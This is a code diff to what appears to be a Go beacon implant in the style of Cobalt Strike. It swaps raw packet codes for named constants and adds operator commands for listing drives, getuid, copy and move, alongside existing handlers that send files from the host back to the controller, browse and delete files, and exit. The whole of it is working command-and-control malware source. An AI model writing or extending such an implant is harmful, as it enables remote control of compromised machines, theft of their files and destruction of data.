@@ -79,7 +79,7 @@ func main() {
 										requestID := crypt.RandomInt(10000, 99999)
 										requestIDBytes := packet.WriteInt(requestID)
 										result := util.BytesCombine(requestIDBytes, fileLenBytes, filePath)
-										finalPaket := packet.MakePacket(2, result)
+										finalPaket := packet.MakePacket(packet.BEACON_RSP_DOWNLOAD_START, result)
 										packet.PushResult(finalPaket)
 
 										fileHandle, err := os.Open(strFilePath)
@@ -99,20 +99,35 @@ func main() {
 											}
 											fileContent = fileBuf[:n]
 											result = util.BytesCombine(requestIDBytes, fileContent)
-											finalPaket = packet.MakePacket(8, result)
+											finalPaket = packet.MakePacket(packet.BEACON_RSP_DOWNLOAD_WRITE, result)
 											packet.PushResult(finalPaket)
 										}
 
-										finalPaket = packet.MakePacket(9, requestIDBytes)
+										finalPaket = packet.MakePacket(packet.BEACON_RSP_DOWNLOAD_COMPLETE, requestIDBytes)
 										packet.PushResult(finalPaket)
 									case packet.CMD_TYPE_FILE_BROWSE:
 										dirResult := packet.File_Browse(cmdBuf)
-										finalPacket := packet.MakePacket(22, dirResult)
+										finalPacket := packet.MakePacket(packet.BEACON_RSP_FILE_BROWSE_RESULT, dirResult)
 										packet.PushResult(finalPacket)
 									case packet.CMD_TYPE_CD:
 										packet.ChangeCurrentDir(cmdBuf)
 									case packet.CMD_TYPE_RM:
 										packet.RemoveFile(cmdBuf)
+									case packet.CMD_TYPE_DRIVES:
+										driveResult := packet.ListDrives()
+										finalPacket := packet.MakePacket(packet.BEACON_RSP_OUTPUT, driveResult)
+										packet.PushResult(finalPacket)
+									case packet.CMD_TYPE_GETUID:
+										getuidResult := packet.GetUid()
+										finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_GETUID, getuidResult)
+										packet.PushResult(finalPacket)
+									case packet.CMD_TYPE_CP:
+										// fmt.Printf("%x\n", cmdBuf)
+										fromPath, toPath := packet.ParseCommandCopyMove(cmdBuf)
+										packet.CopyFile(fromPath, toPath)
+									case packet.CMD_TYPE_MV:
+										fromPath, toPath := packet.ParseCommandCopyMove(cmdBuf)
+										packet.MoveFile(fromPath, toPath)
 									case packet.CMD_TYPE_SLEEP:
 										sleep := packet.ReadInt(cmdBuf[:4])
 										//jitter := packet.ReadInt(cmdBuf[4:8])
@@ -120,7 +135,7 @@ func main() {
 										config.WaitTime = time.Duration(sleep) * time.Millisecond
 									case packet.CMD_TYPE_PWD:
 										pwdResult := packet.GetCurrentDirectory()
-										finPacket := packet.MakePacket(32, pwdResult)
+										finPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_GETCWD, pwdResult) // 32
 										packet.PushResult(finPacket)
 									case packet.CMD_TYPE_EXIT:
 										os.Exit(0)
